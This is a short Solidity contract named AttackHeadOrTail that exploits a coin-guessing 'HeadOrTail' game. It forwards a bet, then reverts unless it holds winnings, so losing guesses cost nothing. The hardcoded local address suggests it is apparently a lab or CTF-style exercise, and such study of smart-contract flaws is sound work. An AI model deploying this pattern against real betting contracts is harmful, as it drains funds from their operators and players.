// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./HeadOrTail.sol";

contract AttackHeadOrTail {
    address HeadOrTailAddress = 0xd9145CCE52D386f254917e481eB44e9943F39138;

    function attack(bool _guess) public payable {
        HeadOrTail(HeadOrTailAddress).guess{value: msg.value}(_guess);
        require(address(this).balance != 0);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
